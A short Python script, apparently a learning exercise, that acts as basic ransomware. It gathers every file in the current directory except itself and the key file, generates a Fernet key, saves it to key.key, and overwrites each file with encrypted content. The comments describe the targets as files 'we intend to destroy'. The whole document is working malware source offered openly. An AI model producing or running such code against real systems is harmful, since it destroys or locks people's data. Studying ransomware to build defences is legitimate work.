#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#store the files to a list

files = []      #this creates an empty list that will further be used to store the files


for i in os.listdir():  #this will run through every file that it finds in the os.listdir() (represents the directory)
        if i == "ransomware.py" or i == "key.key":      #if the current file is called ransomware.py, then it will pass it and not add it
                continue                        # to the list as we don't want to encript this file
        if os.path.isfile(i):                   #this is a builtin fucntion that determines if the things within the directory are files or not (if yes, append, if not, move forward)
                files.append(i)                 #this command will add the current file to the list


print(files)

file_key = Fernet.generate_key()

with open("key.key", "wb") as key:      #this command will be using the open function to create or open the file called key.key and open it in the write binary mode and we will
                                        #be reffering to the key as key
        key.write(file_key)             # we will be writting the variable file_key into the instance key


# this method will go through each file within the list of files and open each file in read binary method as read_file and save the current file to
# the read_content variable, to which we will be using the read method on the file

# this command will go only through the files that we intend to destroy

for j in files:
        with open(j, "rb") as read_file:
                read_content = read_file.read()

# encrypt the files
# this will create a new variable that will store the encrypted data
# Fernet will  reference the key generator that will be used to encrypt the file
# .encrypt will reference the content of the file that we want to encrypt
        encrypted_content = Fernet(file_key).encrypt(read_content)

# this will write the encrypted version back to the file
        with open(j, "wb") as write_file:
                write_file.write(encrypted_content)



